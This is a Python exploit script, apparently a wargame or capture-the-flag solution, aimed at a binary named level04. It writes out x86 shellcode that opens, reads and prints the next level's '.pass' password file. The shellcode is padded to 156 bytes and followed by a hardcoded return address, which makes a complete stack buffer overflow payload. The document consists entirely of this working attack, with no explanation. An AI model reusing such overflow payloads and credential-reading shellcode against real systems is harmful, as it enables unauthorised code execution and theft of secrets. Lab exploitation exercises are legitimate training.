# cat <(python /tmp/xplt.py) | env -i COLUMNS=136 PWD=/home/users/level04 LINES=32 /home/users/level04/level04

import struct

shcode = "\x31\xc0\x50\x68\x70\x61\x73\x73\x68\x30\x35\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\xb0\x05\x89\xe3\x31\xc9\xcd\x80\x89\xc3\x31\xc0\x31\xd2\xb0\x03\x89\xe1\xb2\x28\xcd\x80\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x89\xe1\xb2\x28\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80"

pad = 'A'* ( 156 - len(shcode))
addr = struct.pack("<I", 0xffffdd80)

print shcode + pad + addr
